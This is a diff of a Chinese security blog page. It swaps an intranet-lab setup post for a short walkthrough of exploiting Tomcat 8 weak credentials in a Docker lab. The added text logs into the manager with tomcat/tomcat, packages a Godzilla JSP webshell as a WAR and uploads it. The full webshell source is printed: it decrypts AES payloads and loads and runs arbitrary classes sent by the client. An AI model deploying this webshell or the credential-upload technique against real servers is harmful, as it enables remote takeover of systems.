@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网环境搭建, l0odrd的博客">
+    <meta name="keywords" content="tomcat8 弱口令, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网环境搭建 | l0odrd的博客</title>
+    <title>tomcat8 弱口令 | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -244,12 +244,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网环境搭建</h1>
+                    <h1 class="description center-align post-title">tomcat8 弱口令</h1>
                 </div>
             </div>
         </div>
@@ -365,8 +365,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91/">
-                                <span class="chip bg-color">内网</span>
+                            <a href="/tags/Tomcat/">
+                                <span class="chip bg-color">Tomcat</span>
                             </a>
                         
                     </div>
@@ -377,8 +377,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91/" class="post-category">
-                                内网
+                            <a href="/categories/Tomcat/" class="post-category">
+                                Tomcat
                             </a>
                         
                     </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-15
+                    2021-09-09
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-17
+                    2021-09-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    507
+                    541
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -431,61 +431,19 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
-<p><img src="https://i.loli.net/2021/07/16/b4RUcqX2y8prB9l.png" alt="image-20210716122325331"></p>
-<p>pfSense(充当路由、防火墙)</p>
+                <h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>docker搭建环境</p>
+<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
+<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
+<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
+<p>找到上传点</p>
+<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
 <blockquote>
-<p> 基于FreeBSD，专为防火墙和路由器功能定制的开源版本</p>
+<p>111.jsp</p>
 </blockquote>
-<p>直接选择<code>典型</code>添加<code>iso</code>镜像文件，进行创建</p>
-<p><img src="https://i.loli.net/2021/07/15/83iYPIeaX7dk9EZ.png" alt="image-20210715212155511"></p>
-<p>按顺序配置五个网卡</p>
-<p><img src="https://i.loli.net/2021/07/15/cIiqQey6FXjflD5.png" alt="image-20210715204928890"></p>
-<p><del>编辑里添加一下<code>iso</code>镜像文件</del></p>
-<p><del>等待网卡配置</del></p>
-<p>不用自定义安装直接</p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715211852671.png" alt="image-20210715211852671"></p>
-<p>这里为什么要设置为<code>192.168.229.253</code>？是因为<code>VMnet8</code>网卡的地址是<code>192.168.229.1</code>（网卡地址如果没有的话可以自己设置一个静态ip）</p>
-<p><img src="https://i.loli.net/2021/07/15/WcrRpSlfYFvO8zd.png" alt="image-20210715231253905"></p>
-<p>访问</p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230832578.png" alt="image-20210715230832578"></p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230843355.png" alt="image-20210715230843355"></p>
-<p><img src="https://i.loli.net/2021/07/15/Jr4YvDmiu1oMxaE.png" alt="image-20210715231538625"></p>
-<p>系统，常规设置中修改语言为中文</p>
-<p>网络接口，接口管理中添加三个接口，就是和虚拟机中设置的三个网卡相对应</p>
-<p><img src="https://i.loli.net/2021/07/16/KEPRadL135WwmgM.png" alt="image-20210716100449009"></p>
-<p>点击进入<code>OPT1</code>，启用接口，进行描述，选择IPv4类型为静态，并将IPv4地址设置为<code>172.16.1.254</code>，子网掩码为24位，保存配置–&gt;应用更改</p>
-<p><img src="https://i.loli.net/2021/07/16/K6A4bvPsLa8gjmX.png" alt="image-20210716100821857"></p>
-<p><code>OPT2</code>设置</p>
-<p><img src="https://i.loli.net/2021/07/16/oyip2gbzdH3fx7W.png" alt="image-20210716122518464"></p>
-<p>子网掩码的位数可以设置为8</p>
-<p><img src="https://i.loli.net/2021/07/16/OsZTFUKDYRBGy3H.png" alt="image-20210716123516667"></p>
-<p>分别添加<code>DMZ``OA``SERVER</code>规则策略</p>
-<p>防火墙–&gt;规则策略–&gt;添加–&gt;协议设置为<code>any</code></p>
-<p><img src="https://i.loli.net/2021/07/16/7gRYhTNWtjVU2Dz.png" alt="image-20210716123634964"></p>
-<h3 id="win-server-2012配置"><a href="#win-server-2012配置" class="headerlink" title="win server 2012配置"></a>win server 2012配置</h3><p>关闭防火墙</p>
-<p><img src="https://i.loli.net/2021/07/16/IJLlESr5npFYkxt.png" alt="image-20210716152633707"></p>
-<p>看图启动即可</p>
-<p><img src="https://i.loli.net/2021/07/16/ngqcdIQBjoRiuK2.png" alt="image-20210716153224867"></p>
-<p>配置ip地址</p>
-<p><img src="https://i.loli.net/2021/07/16/GOUnqcRQ8Wwavg3.png" alt="image-20210716170524052"></p>
-<p><img src="https://i.loli.net/2021/07/16/SpV1FGZL5cYyO3j.png" alt="image-20210716170621213"></p>
-<h3 id="win7配置"><a href="#win7配置" class="headerlink" title="win7配置"></a>win7配置</h3><p>设置一下ip地址和dns服务器，关闭防火墙</p>
-<p><img src="https://i.loli.net/2021/07/16/FTPyeKYgbX8fkHi.png" alt="image-20210716171409092"></p>
-<h3 id="win-server-2008配置"><a href="#win-server-2008配置" class="headerlink" title="win server 2008配置"></a>win server 2008配置</h3><p><img src="https://i.loli.net/2021/07/16/7VFYrJ3KBj4i2nZ.png" alt="image-20210716173951902"></p>
-<p>ping一下三个服务器测试一下连通性</p>
-<p><img src="https://i.loli.net/2021/07/16/HpR6wQzer4dnqXA.png" alt="image-20210716172349367"></p>
-<p>改了一下路由器接口的ip，都通了</p>
-<h3 id="设置DHCP为OA分配ip"><a href="#设置DHCP为OA分配ip" class="headerlink" title="设置DHCP为OA分配ip"></a>设置DHCP为OA分配ip</h3><p>系统服务–&gt;DHCP服务–&gt;OA</p>
-<p>还要设置网关为<code>192.168.1.254</code></p>
-<p><img src="https://i.loli.net/2021/07/16/ZckVML1FrsUTNfv.png" alt="image-20210716174450675"></p>
-<p> <del>后面我把win7调回自动分配ip但还是识别的<code>192.168.229</code>网段</del></p>
-<p>重启加重新配置了几次，自动识别可以了</p>
-<p><img src="https://i.loli.net/2021/07/16/eZqy4wPBUVS67vH.png" alt="image-20210716181223254"></p>
-<h3 id="更改防火墙规则只允许OA区上网"><a href="#更改防火墙规则只允许OA区上网" class="headerlink" title="更改防火墙规则只允许OA区上网"></a>更改防火墙规则只允许OA区上网</h3><p>防火墙–&gt;地址转换–&gt;出站</p>
-<p>改为<code>手动</code>，删除其他映射，只设置一个原地址为<code>192.168.1.0</code>的映射</p>
-<p><img src="https://i.loli.net/2021/07/16/pf1mlC3yDnXQGSY.png" alt="image-20210716175822922"></p>
-<p><img src="https://i.loli.net/2021/07/16/jYhwganJcfWIbrN.png" alt="image-20210716164808262"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>上传111.war，连接</p>
+<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
+<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
 
                 
             </div>
@@ -512,7 +470,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">https://King10280.github.io/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a>
+                    <a href="https://King10280.github.io/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/">https://King10280.github.io/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -550,8 +508,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91/">
-                                    <span class="chip bg-color">内网</span>
+                                <a href="/tags/Tomcat/">
+                                    <span class="chip bg-color">Tomcat</span>
                                 </a>
                             
                         </div>
@@ -597,17 +555,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/19/ctfhub%E4%B9%8Bssrf/">
+                <a href="/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="ctfhub之ssrf">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="tomcat8 弱口令">
                         
-                        <span class="card-title">ctfhub之ssrf</span>
+                        <span class="card-title">tomcat8 弱口令</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -617,26 +576,27 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctf/" class="post-category">
-                                    ctf
+                            <a href="/categories/Tomcat/" class="post-category">
+                                    Tomcat
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/Tomcat/">
+                        <span class="chip bg-color">Tomcat</span>
                     </a>
                     
                 </div>
@@ -650,13 +610,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/">
+                <a href="/2021/09/09/shiro-CVE-2016-4437/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="常见web漏洞学习之SSRF">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="shiro CVE-2016-4437">
                         
-                        <span class="card-title">常见web漏洞学习之SSRF</span>
+                        <span class="card-title">shiro CVE-2016-4437</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -667,15 +627,27 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-09
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            l0odrd
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/shiro/" class="post-category">
+                                    shiro
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/shiro/">
+                        <span class="chip bg-color">shiro</span>
+                    </a>
+                    
                 </div>
                 
             </div>
